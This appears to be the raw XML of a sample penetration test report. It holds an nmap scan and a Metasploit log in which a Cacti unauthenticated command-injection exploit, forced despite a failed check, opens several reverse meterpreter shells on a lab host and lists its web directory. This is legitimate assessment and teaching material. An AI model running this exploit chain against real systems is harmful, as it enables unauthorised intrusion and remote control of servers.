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96573"/>
            <wp:docPr id="1" name="Picture 1"/>
            <wp:cNvGraphicFramePr>
              <a:graphicFrameLocks noChangeAspect="1"/>
            </wp:cNvGraphicFramePr>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="ugm.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="1828800" cy="1896573"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect"/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Sample Penetration Test Report Example Company</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        Company: Penelitian Damas 2024</w:t>
        <w:br/>
        <w:t xml:space="preserve">        Authors: N.R. Rosyid, Y. M. Saputra, Anni K. Fauziyah, Yoan Navie Ananda</w:t>
        <w:br/>
        <w:t xml:space="preserve">        Date: 23 October 2025</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7.97 scan initiated Thu Oct 23 06:21:37 2025 as: nmap -sV -Pn --script http-enum -oN nmap_results.txt 127.0.0.1</w:t>
        <w:br/>
        <w:t>Nmap scan report for localhost (127.0.0.1)</w:t>
        <w:br/>
        <w:t>Host is up (0.000039s latency).</w:t>
        <w:br/>
        <w:t>Not shown: 999 closed tcp ports (conn-refused)</w:t>
        <w:br/>
        <w:t>PORT     STATE SERVICE VERSION</w:t>
        <w:br/>
        <w:t>8080/tcp open  http    Apache httpd 2.4.54 ((Debian))</w:t>
        <w:br/>
        <w:t>|_http-server-header: Apache/2.4.54 (Debian)</w:t>
        <w:br/>
        <w:t xml:space="preserve">| http-enum: </w:t>
        <w:br/>
        <w:t>|_  /docs/: Potentially interesting folder</w:t>
        <w:br/>
        <w:br/>
        <w:t>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</w:t>
        <w:br/>
        <w:t># Nmap done at Thu Oct 23 06:21:45 2025 -- 1 IP address (1 host up) scanned in 7.93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scanning result of target 127.0.0.1 </w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] Using configured payload linux/x86/meterpreter/reverse_tcp</w:t>
        <w:br/>
        <w:t>RHOSTS =&gt; 127.0.0.1</w:t>
        <w:br/>
        <w:t>RPORT =&gt; 8080</w:t>
        <w:br/>
        <w:t>TARGETURI =&gt; /cacti</w:t>
        <w:br/>
        <w:t>[*] 127.0.0.1:8080 - The target is not exploitable. Target is not a Cacti application.</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exploitResource.rc for ERB directives.</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; use exploit/linux/http/cacti_unauthenticated_cmd_injection</w:t>
        <w:br/>
        <w:t>[*] Using configured payload linux/x86/meterpreter/reverse_tcp</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; set RHOSTS 10.33.102.225</w:t>
        <w:br/>
        <w:t>RHOSTS =&gt; 10.33.102.225</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; set RPORT 80</w:t>
        <w:br/>
        <w:t>RPORT =&gt; 80</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; set LHOST 10.33.102.151</w:t>
        <w:br/>
        <w:t>LHOST =&gt; 10.33.102.151</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; set TARGETURI /cacti</w:t>
        <w:br/>
        <w:t>TARGETURI =&gt; /cacti</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; set ForceExploit True</w:t>
        <w:br/>
        <w:t>ForceExploit =&gt; true</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; exploit -j</w:t>
        <w:br/>
        <w:t>[*] Exploit running as background job 0.</w:t>
        <w:br/>
        <w:t>[*] Exploit completed, but no session was created.</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; sleep 20</w:t>
        <w:br/>
        <w:t xml:space="preserve">[*] Started reverse TCP handler on 10.33.102.151:4444 </w:t>
        <w:br/>
        <w:t>[*] Running automatic check ("set AutoCheck false" to disable)</w:t>
        <w:br/>
        <w:t>[!] The target is not exploitable. Target is not a Cacti application. ForceExploit is enabled, proceeding with exploitation.</w:t>
        <w:br/>
        <w:t>[*] Trying to bruteforce an exploitable host_id and local_data_id by trying up to 500 combinations</w:t>
        <w:br/>
        <w:t>[*] Enumerating local_data_id values for host_id 1</w:t>
        <w:br/>
        <w:t>[*] Sending stage (1017704 bytes) to 10.33.102.225</w:t>
        <w:br/>
        <w:t>[*] Sending stage (1017704 bytes) to 10.33.102.225</w:t>
        <w:br/>
        <w:t>[*] Sending stage (1017704 bytes) to 10.33.102.225</w:t>
        <w:br/>
        <w:t>[*] Sending stage (1017704 bytes) to 10.33.102.225</w:t>
        <w:br/>
        <w:t>[*] Sending stage (1017704 bytes) to 10.33.102.225</w:t>
        <w:br/>
        <w:t>[+] Found exploitable local_data_id 6 for host_id 1</w:t>
        <w:br/>
        <w:t>[*] Command Stager progress - 100.00% done (1118/1118 bytes)</w:t>
        <w:br/>
        <w:t>[*] Sending stage (1017704 bytes) to 10.33.102.225</w:t>
        <w:br/>
        <w:t>[*] Meterpreter session 2 opened (10.33.102.151:4444 -&gt; 10.33.102.225:50312) at 2025-08-21 07:58:17 +0700</w:t>
        <w:br/>
        <w:t>[*] Meterpreter session 1 opened (10.33.102.151:4444 -&gt; 10.33.102.225:50306) at 2025-08-21 07:58:17 +0700</w:t>
        <w:br/>
        <w:t>[*] Meterpreter session 3 opened (10.33.102.151:4444 -&gt; 10.33.102.225:50320) at 2025-08-21 07:58:18 +0700</w:t>
        <w:br/>
        <w:t>[*] Meterpreter session 4 opened (10.33.102.151:4444 -&gt; 10.33.102.225:50330) at 2025-08-21 07:58:18 +0700</w:t>
        <w:br/>
        <w:t>[*] Meterpreter session 6 opened (10.33.102.151:4444 -&gt; 10.33.102.225:50342) at 2025-08-21 07:58:19 +0700</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; sessions -i</w:t>
        <w:br/>
        <w:br/>
        <w:t>Active sessions</w:t>
        <w:br/>
        <w:t>===============</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  Id  Name  Type                   Information            Connection</w:t>
        <w:br/>
        <w:t xml:space="preserve">  --  ----  ----                   -----------            ----------</w:t>
        <w:br/>
        <w:t xml:space="preserve">  1         meterpreter x86/linux  www-data @ 172.23.0.3  10.33.102.151:4444 -&gt; 10.33.102.225:50306 (10.33.102.225)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  2         meterpreter x86/linux  www-data @ 172.23.0.3  10.33.102.151:4444 -&gt; 10.33.102.225:50312 (10.33.102.225)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  3         meterpreter x86/linux  www-data @ 172.23.0.3  10.33.102.151:4444 -&gt; 10.33.102.225:50320 (10.33.102.225)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  4         meterpreter x86/linux  www-data @ 172.23.0.3  10.33.102.151:4444 -&gt; 10.33.102.225:50330 (10.33.102.225)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  5         meterpreter x86/linux                         10.33.102.151:4444 -&gt; 10.33.102.225:50332 (10.33.102.225)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  6         meterpreter x86/linux  www-data @ 172.23.0.3  10.33.102.151:4444 -&gt; 10.33.102.225:50342 (10.33.102.225)</w:t>
        <w:br/>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; sessions -c 'ls -la' -i 1</w:t>
        <w:br/>
        <w:t>[*] Running 'ls -la' on meterpreter session 1 (10.33.102.225)</w:t>
        <w:br/>
        <w:t>total 2820</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 31 00:56 .</w:t>
        <w:br/>
        <w:t>drwxrwxrwx 1 www-data www-data   4096 Jul 30 07:05 ..</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:05 .git</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:05 .github</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   1577 Jul 30 07:05 .gitignore</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data    577 Jul 30 07:05 .mdl_style.rb</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data     60 Jul 30 07:05 .mdlrc</w:t>
        <w:br/>
        <w:t>-rw------- 1 www-data www-data   1024 Jul 31 00:56 .rnd</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   3795 Jul 30 07:05 .travis.yml</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data 254887 Jul 30 07:05 CHANGELOG</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  15171 Jul 30 07:05 LICENSE</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  11318 Jul 30 07:05 README.md</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   4341 Jul 30 07:05 about.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  63112 Jul 30 07:05 aggregate_graphs.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  18586 Jul 30 07:05 aggregate_items.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  25705 Jul 30 07:05 aggregate_templates.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  14677 Jul 30 07:05 auth_changepassword.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  15221 Jul 30 07:05 auth_login.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  19044 Jul 30 07:05 auth_profile.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  24203 Jul 30 07:05 automation_devices.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  36742 Jul 30 07:05 automation_graph_rules.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  42897 Jul 30 07:05 automation_networks.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  31517 Jul 30 07:05 automation_snmp.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  18773 Jul 30 07:05 automation_templates.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  38723 Jul 30 07:05 automation_tree_rules.php</w:t>
        <w:br/>
        <w:t>-rwxr-xr-x 1 www-data www-data   2959 Jul 30 07:05 boost_rrdupdate.php</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:05 cache</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data 126187 Jul 30 07:05 cacti.sql</w:t>
        <w:br/>
        <w:t>-rwxr-xr-x 1 www-data www-data   8077 Jul 30 07:05 cactid.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  29268 Jul 30 07:05 cdef.php</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:05 cli</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   1934 Jul 30 07:05 clog.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   1940 Jul 30 07:05 clog_user.php</w:t>
        <w:br/>
        <w:t>-rwxr-xr-x 1 www-data www-data  33597 Jul 30 07:05 cmd.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   8843 Jul 30 07:05 cmd_realtime.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  24350 Jul 30 07:05 color.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  24889 Jul 30 07:05 color_templates.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  13259 Jul 30 07:05 color_templates_items.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  34558 Jul 30 07:05 data_debug.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  35500 Jul 30 07:05 data_input.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  49788 Jul 30 07:05 data_queries.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  37433 Jul 30 07:05 data_source_profiles.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  67358 Jul 30 07:05 data_sources.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  47694 Jul 30 07:05 data_templates.php</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:05 docs</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:05 formats</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  14319 Jul 30 07:05 gprint_presets.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  22061 Jul 30 07:05 graph.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   5764 Jul 30 07:05 graph_image.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   9136 Jul 30 07:05 graph_json.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  17525 Jul 30 07:05 graph_realtime.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  41401 Jul 30 07:05 graph_templates.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   9586 Jul 30 07:05 graph_templates_inputs.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  30755 Jul 30 07:05 graph_templates_items.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  32392 Jul 30 07:05 graph_view.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  12466 Jul 30 07:05 graph_xport.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  88406 Jul 30 07:05 graphs.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  26995 Jul 30 07:05 graphs_items.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  35613 Jul 30 07:05 graphs_new.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   3727 Jul 30 07:05 help.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  67581 Jul 30 07:05 host.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  30239 Jul 30 07:05 host_templates.php</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:05 images</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:06 include</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   5721 Jul 30 07:05 index.php</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:05 install</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:05 lib</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   3495 Jul 30 07:05 link.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  21889 Jul 30 07:05 links.php</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:05 locales</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 31 00:56 log</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   4666 Jul 30 07:05 logout.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  38081 Jul 30 07:05 managers.php</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:05 mibs</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   3410 Jul 30 07:05 permission_denied.php</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:05 plugins</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  28268 Jul 30 07:05 plugins.php</w:t>
        <w:br/>
        <w:t>-rwxr-xr-x 1 www-data www-data  35920 Jul 30 07:05 poller.php</w:t>
        <w:br/>
        <w:t>-rwxr-xr-x 1 www-data www-data  38581 Jul 30 07:05 poller_automation.php</w:t>
        <w:br/>
        <w:t>-rwxr-xr-x 1 www-data www-data  35791 Jul 30 07:05 poller_boost.php</w:t>
        <w:br/>
        <w:t>-rwxr-xr-x 1 www-data www-data   7095 Jul 30 07:05 poller_commands.php</w:t>
        <w:br/>
        <w:t>-rwxr-xr-x 1 www-data www-data  11602 Jul 30 07:05 poller_dsstats.php</w:t>
        <w:br/>
        <w:t>-rwxr-xr-x 1 www-data www-data  20170 Jul 30 07:05 poller_maintenance.php</w:t>
        <w:br/>
        <w:t>-rwxr-xr-x 1 www-data www-data   9881 Jul 30 07:05 poller_realtime.php</w:t>
        <w:br/>
        <w:t>-rwxr-xr-x 1 www-data www-data   8830 Jul 30 07:05 poller_recovery.php</w:t>
        <w:br/>
        <w:t>-rwxr-xr-x 1 www-data www-data   5722 Jul 30 07:05 poller_reports.php</w:t>
        <w:br/>
        <w:t>-rwxr-xr-x 1 www-data www-data   8273 Jul 30 07:05 poller_spikekill.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  39278 Jul 30 07:05 pollers.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  14552 Jul 30 07:05 remote_agent.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   5309 Jul 30 07:05 reports_admin.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   5210 Jul 30 07:05 reports_user.php</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:05 resource</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:05 rra</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  20183 Jul 30 07:05 rrdcleaner.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  11907 Jul 30 07:05 script_server.php</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 31 00:55 scripts</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:05 service</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   1728 Jul 30 07:05 service_check.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  43453 Jul 30 07:05 settings.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  20567 Jul 30 07:05 sites.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   2414 Jul 30 07:05 snmpagent_mibcache.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   3688 Jul 30 07:05 snmpagent_mibcachechild.php</w:t>
        <w:br/>
        <w:t>-rwxr-xr-x 1 www-data www-data   5510 Jul 30 07:05 snmpagent_persist.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   3987 Jul 30 07:05 spikekill.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   6597 Jul 30 07:05 templates_export.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data   6263 Jul 30 07:05 templates_import.php</w:t>
        <w:br/>
        <w:t>drwxr-xr-x 1 www-data www-data   4096 Jul 30 07:05 tests</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  64922 Jul 30 07:05 tree.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  99936 Jul 30 07:05 user_admin.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  29909 Jul 30 07:05 user_domains.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  89318 Jul 30 07:05 user_group_admin.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data 104198 Jul 30 07:05 utilities.php</w:t>
        <w:br/>
        <w:t>-rw-r--r-- 1 www-data www-data  28883 Jul 30 07:05 vdef.php</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; sleep 10</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt; exit</w:t>
        <w:br/>
        <w:t>[*] You have active sessions open, to exit anyway type "exit -y"</w:t>
        <w:br/>
        <w:t>resource (exploitResource.rc)&gt;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